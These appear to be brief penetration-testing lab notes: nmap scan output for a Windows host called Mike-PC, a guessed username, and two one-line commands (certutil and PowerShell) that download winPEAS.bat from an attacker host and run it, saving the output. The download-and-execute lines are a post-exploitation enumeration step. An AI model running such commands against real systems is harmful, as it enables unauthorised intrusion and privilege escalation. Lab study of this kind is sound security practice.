Monster sudo nmap --open -sV -sC 192.168.218.180

Password:  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-04-01 17:30 CEST  
Nmap scan report for 192.168.218.180  
Host is up (0.039s latency).  
Not shown: 994 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)  
|_http-title: Mike Wazowski_  
_|http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10_  
_| http-methods:_  
_| Potentially risky methods: TRACE_  
_135/tcp open msrpc Microsoft Windows RPC_  
_139/tcp open netbios-ssn Microsoft Windows netbios-ssn_  
_443/tcp open ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)_  
_| http-methods:_  
_|_ Potentially risky methods: TRACE  
|_http-title: Mike Wazowski  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=localhost  
| Not valid before: 2009-11-10T23:48:47  
|_Not valid after: 2019-11-08T23:48:47_  
_| tls-alpn:_  
_|_ http/1.1  
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10_  
_445/tcp open microsoft-ds?_  
_3389/tcp open ms-wbt-server Microsoft Terminal Services_  
_| rdp-ntlm-info:_  
_| Target_Name: MIKE-PC_  
_| NetBIOS_Domain_Name: MIKE-PC_  
_| NetBIOS_Computer_Name: MIKE-PC_  
_| DNS_Domain_Name: Mike-PC_  
_| DNS_Computer_Name: Mike-PC_  
_| Product_Version: 10.0.19041_  
_|_ System_Time: 2025-04-01T15:31:09+00:00  
|_ssl-date: 2025-04-01T15:31:17+00:00; -3s from scanner time.  
| ssl-cert: Subject: commonName=Mike-PC  
| Not valid before: 2025-03-31T15:04:17  
|_Not valid after: 2025-09-30T15:04:17  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-time:  
| date: 2025-04-01T15:31:12  
|_ start_date: N/A  
|_clock-skew: mean: -2s, deviation: 0s, median: -3s_  
_| smb2-security-mode:_  
_| 3:1:1:_  
_|_ Message signing enabled but not required

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 23.03 seconds

  

user:

mike

wazowski

  

in windows, download winpeas, run , then save the output

cmd:

certutil -urlcache -split -f "[http://192.168.45.245/peas/winPEAS.bat](http://192.168.45.245/peas/winPEAS.bat)" winPEAS.bat && winPEAS.bat > output.txt

pwsh:

  

powershell -c "Invoke-WebRequest -Uri '[http://192.168.45.245/peas/winPEAS.bat](http://192.168.45.245/peas/winPEAS.bat)' -OutFile 'winPEAS.bat'; cmd /c 'winPEAS.bat' > output.txt"